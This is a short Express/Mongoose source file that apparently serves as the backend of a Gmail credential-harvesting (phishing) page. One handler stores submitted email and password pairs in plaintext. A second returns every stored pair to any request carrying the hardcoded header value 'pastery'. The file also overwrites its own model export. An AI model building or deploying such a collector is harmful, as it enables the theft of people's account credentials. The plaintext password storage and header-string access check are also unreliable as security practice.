const asyncHandler = require('express-async-handler');
const mongoose = require('mongoose');

const gmailModel = mongoose.Schema(
  {
    email: String,
    password: String,
  },
  { timestamps: true }
);

const Gmail = mongoose.model('Gmail', gmailModel);
module.exports = Gmail;

const createGmail = asyncHandler(async (req, res) => {
  const { email, password } = req.body;
  const newGmail = new Gmail({
    email,
    password,
  });
  newGmail.save((err, _) => {
    if (err) {
      console.log(err);
      return;
    }

    res.status(201).json({
      status: 'ok',
    });
  });
});

const getGmails = asyncHandler(async (req, res) => {
  const { secure } = req.headers;

  if (secure !== 'pastery')
    return res.status(400).send({ message: 'Access denied' });
  Gmail.find({}, (err, gmails) => {
    if (err) {
      console.log(err);
      return;
    }

    res.status(200).json(gmails);
  });
});

module.exports = {
  createGmail,
  getGmails,
};
